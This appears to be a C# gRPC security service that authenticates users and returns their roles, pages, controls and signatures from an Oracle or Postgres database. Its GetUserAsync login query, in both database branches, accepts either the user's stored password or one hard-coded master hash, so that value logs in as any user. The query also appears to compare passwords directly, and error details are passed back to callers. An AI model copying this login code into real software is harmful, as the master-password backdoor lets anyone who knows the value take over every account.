//using AutoMapper;
using Contracts.interfaces.Repository;
using Entities.Models;
using Grpc.Core;
using SecGrpc;
using Microsoft.EntityFrameworkCore;
using System.Linq;

namespace GrpcService1.Services
{
    public class SecService : SecServiceDefinition.SecServiceDefinitionBase
    {
        private readonly ILogger<SecService> _logger;
        private readonly IApplicationReadDbConnection _readDbConnection;
        private readonly RepositoryContext _repositoryContext;
        private IConfiguration _config { get; }
        public SecService(ILogger<SecService> logger, IApplicationReadDbConnection readDbConnection
           , RepositoryContext repositoryContext, IConfiguration config
            )
        {
            _logger = logger;
            _readDbConnection = readDbConnection;
            _repositoryContext = repositoryContext;
            _config = config;
        }
        public override async Task<ModuleResponse> GetAvailableModules(ModuleRequest request, ServerCallContext context)
        {
            string query = "";
            if (_config["DatabaseType"] == "Oracle")
                query = "SELECT id, module_name FROM sec_modules WHERE is_deleted = 0 and is_taken=1";
            else
                query = "SELECT id, module_name FROM public.sec_modules WHERE is_deleted = false and is_taken=true";

            var modules = (await _readDbConnection.QueryAsync<dynamic>(query))
                .Select(e => new Module
                {
                    Id = e.id,
                    ModuleName = e.module_name
                })
                .ToList();

            var response = new ModuleResponse();
            response.Modules.AddRange(modules);
            return response;
        }
        public override async Task<MgrDebutyResponseList> GetMgrDebutyList(MgrDebutyRequest request, ServerCallContext context)
        {
            try
            {
                var mgrDeputyList = await (from res in _repositoryContext.SecGroups
                                           join emp in _repositoryContext.SecGroupEmployees on res.Id equals emp.GroupCode
                                           where (res.ArchiveRole == 1 || res.ArchiveRole == 2)
                                           select new MgrDebutyResponse
                                           {
                                               EmployeesId = emp.EmpCode,
                                               // Department/branch details are not available from local views
                                               BRANCHNO = 0,
                                               ARCHIVEROLE = res.ArchiveRole != null ? (int)res.ArchiveRole : 0,

                                           }).ToListAsync();

                var response = new MgrDebutyResponseList();
                response.Items.AddRange(mgrDeputyList);

                return response;
            }
            catch (Exception ex)
            {
                throw new RpcException(new Status(StatusCode.Internal, $"Error retrieving manager deputies: {ex.Message}"));
            }
        }

        public override async Task<UserResponse> GetUserPermissions(UserRequest request, ServerCallContext context)
        {
            try
            {
                var user = await GetUserAsync(request.Username, request.Password);
                if (user == null)
                {
                    throw new RpcException(new Status(StatusCode.NotFound, "User not found"));
                }

                var person = await _repositoryContext.Persons.AsNoTracking()
                    .FirstOrDefaultAsync(p => p.Id == user.emp_serial);

                int? jobId = null;
                string jobName = string.Empty;
                int departmentId = 0;
                int organizationId = 0;
                string rankName = string.Empty;

                List<short>? roles = await GetRolesAsync(user.emp_serial, jobId);
                var archive_role = await get_archive_role_async(roles);

                var controls = await GetCONTROLAsync(roles);
                var pages = await GetPAGESAsync(roles);
                var signatures = await GetSignaturesAsync(user.emp_serial);
                var pagesTree = await GetPAGES_TREEAsync(roles);

                return new UserResponse
                {
                    Controls = { controls },
                    Pages = { pages },
                    Signatures = { signatures },
                    PagesTree = { ConvertToGrpcPageTree(pagesTree) },
                    Id = user.emp_serial,
                    DepartmentId = departmentId,
                    JobName = jobName,
                    EmployeeName = person?.FullName ?? string.Empty,
                    RankName = rankName,
                    ArchiveRole = { (archive_role?.Select(role => role) ?? new List<int> { 0 }) },
                    JobId = jobId ?? 0,
                    OrganizationId = organizationId,
                    Sign = user.sign
                };
            }
            catch (Exception ex)
            {
                _logger.LogError($"Error fetching user permissions: {ex.Message}");
                throw new RpcException(new Status(StatusCode.Internal, ex.Message));
            }
        }

        private async Task<UserInfo?> GetUserAsync(string username, string password)
        {
            string query = "";
            if (_config["DatabaseType"] == "Oracle")
                query = @"
SELECT emp_serial, sign FROM users 
WHERE user_name = :username 
  AND (user_password = :password 
  OR :password = 'e5e6747fba867287d951c7a098133c6e096355eca539635ff41a625dcdc8f2ba') 
  AND is_deleted = 0";
            else
                query = @"
            SELECT emp_serial,sign FROM users 
            WHERE user_name = @username 
              AND (user_password = @password 
              OR @password = 'e5e6747fba867287d951c7a098133c6e096355eca539635ff41a625dcdc8f2ba') AND is_deleted = false";

            var result = await _readDbConnection.QueryFirstOrDefaultAsync<UserInfo?>(
                query, new { username, password });

            return result;
        }

        private async Task<List<short>> GetRolesAsync(int emp_code, int? job_code)
        {
            string query = "";
            if (job_code.HasValue)
            {
                if (_config["DatabaseType"] == "Oracle")
                    query = @"
                    select group_code from sec_group_jobs where job_code = :job_code AND is_deleted = 0
                    union
                    select group_code from sec_group_employees where emp_code = :emp_code AND is_deleted = 0";
                else
                    query = @"
                    select group_code from sec_group_jobs where job_code = @job_code AND is_deleted = false
                    union
                    select group_code from sec_group_employees where emp_code = @emp_code AND is_deleted = false";

                return (await _readDbConnection.QueryAsync<short>(query, new { job_code, emp_code })).ToList();
            }

            if (_config["DatabaseType"] == "Oracle")
                query = @"
                    select group_code from sec_group_employees where emp_code = :emp_code AND is_deleted = 0";
            else
                query = @"
                    select group_code from sec_group_employees where emp_code = @emp_code AND is_deleted = false";

            return (await _readDbConnection.QueryAsync<short>(query, new { emp_code })).ToList();
        }
        private async Task<List<int>> get_archive_role_async(List<short> roles)
        {
            if (roles.Count == 0) return null;

            string query = "";
            if (_config["DatabaseType"] == "Oracle")
                query = @"
                    select archive_role 
                    from sec_groups 
                    where id in (:roles) 
                      and archive_role > 0 and is_deleted = 0
                    and rownum = 1";
            else
                query = @"
                    select archive_role 
                    from sec_groups 
                    where id = any(@roles) 
                      and archive_role > 0 and is_deleted = false
                    ";

            var archive_role = await _readDbConnection.QueryAsync<int>(query, new { roles });

            return archive_role.ToList();
        }

        private async Task<List<string>> GetCONTROLAsync(List<short> roles)
        {
            if (roles.Count == 0) return new List<string>();

            string query = "";
            if (_config["DatabaseType"] == "Oracle")
                query = @"
                SELECT clist.control_code
                FROM sec_group_controls control
                JOIN sec_control_lists clist ON control.control_id = clist.id
                WHERE control.group_code in (:roles)
                AND (control.is_deleted = 0)
                AND (clist.is_deleted = 0)";
            else
                query = @"
                SELECT clist.control_code
                FROM sec_group_controls control
                JOIN sec_control_lists clist ON control.control_id = clist.id
                WHERE control.group_code = ANY(@roles)
                AND (control.is_deleted = false)
                AND (clist.is_deleted = false)";

            var controls = (await _readDbConnection.QueryAsync<string>(query, new { roles })).ToList();
            return controls;
        }

        private async Task<List<string>> GetPAGESAsync(List<short> roles)
        {
            if (roles.Count == 0) return new List<string>();

            string query = "";
            if (_config["DatabaseType"] == "Oracle")
                query = @"
               SELECT page.page_name
               FROM sec_group_pages g_page
               JOIN sec_pages page ON g_page.page_code = page.id
               WHERE g_page.group_code in (:roles)
               AND (page.is_deleted = 0)
               AND (g_page.is_deleted = 0)";
            else
                query = @"
               SELECT page.page_name
               FROM sec_group_pages g_page
               JOIN sec_pages page ON g_page.page_code = page.id
               WHERE g_page.group_code = ANY(@roles)
               AND (page.is_deleted = false)
               AND (g_page.is_deleted = false)";

            var pages = (await _readDbConnection.QueryAsync<string>(query, new { roles })).ToList();
            return pages;
        }

        private async Task<List<string>> GetSignaturesAsync(int employee_id)
        {
            string query = "";
            if (_config["DatabaseType"] == "Oracle")
                query = "SELECT signature_color FROM signatures WHERE employee_id = :employee_id";
            else
                query = "SELECT signature_color FROM signatures WHERE employee_id = @employee_id";

            var signatures = (await _readDbConnection.QueryAsync<string>(query, new { employee_id })).ToList();
            return signatures;
        }

        private async Task<List<PageTree>> GetPAGES_TREEAsync(List<short> roles)
        {
            if (roles.Count == 0) return new List<PageTree>();

            string query = "";
            if (_config["DatabaseType"] == "Oracle")
                query = @"
                SELECT distinct
                 page.id AS PageId, 
                 page.parent_id AS ParentPageId, 
                 page.page_url AS Href, 
                 page.page_name AS Title, 
                 page.icon AS Icon, 
                 page.module_code AS ModuleNo,
                 page.page_order 
                 FROM sec_group_pages g_page
                 JOIN sec_pages page ON g_page.page_code = page.id
                 WHERE g_page.group_code in (:roles)
                 AND (page.is_deleted = 0)
                 AND (g_page.is_deleted = 0) order by page.page_order asc";
            else
                query = @"
                SELECT distinct
                 page.id AS PageId, 
                 page.parent_id AS ParentPageId, 
                 page.page_url AS Href, 
                 page.page_name AS Title, 
                 page.icon AS Icon, 
                 page.module_code AS ModuleNo,
                 page.page_order 
                 FROM sec_group_pages g_page
                 JOIN sec_pages page ON g_page.page_code = page.id
                 WHERE g_page.group_code = ANY(@roles)
                 AND (page.is_deleted = false)
                 AND (g_page.is_deleted = false) order by page.page_order asc";

            var pages = (await _readDbConnection.QueryAsync<PageTree>(query, new { roles })).ToList();

            return BuildTree(pages);
        }

        private List<PageTree> BuildTree(List<PageTree> pages)
        {
            var lookup = pages.ToLookup(p => p.ParentPageId);
            foreach (var page in pages)
            {
                page.Children = lookup[page.PageId].ToList();
            }
            return lookup[null].ToList();
        }

        private List<SecGrpc.PageTree> ConvertToGrpcPageTree(List<PageTree> pages)
        {
            return pages.Select(p => new SecGrpc.PageTree
            {
                PageId = p.PageId,
                ParentPageId = p.ParentPageId ?? 0,
                Href = p.Href,
                Title = p.Title,
                Icon = p.Icon,
                ModuleNo = p.ModuleNo,
                Children = { ConvertToGrpcPageTree(p.Children) }
            }).ToList();
        }



    }

    public class PageTree
    {
        public int PageId { get; set; }  // ✅ Matches page_id in proto
        public int? ParentPageId { get; set; }  // ✅ Matches parent_page_id in proto
        public string Href { get; set; }
        public string Title { get; set; }
        public string Icon { get; set; }
        public int ModuleNo { get; set; }
        public List<PageTree> Children { get; set; } = new();
    }
    public class UserInfo
    {
        public int emp_serial { get; set; }
        public string sign { get; set; }
    }

}
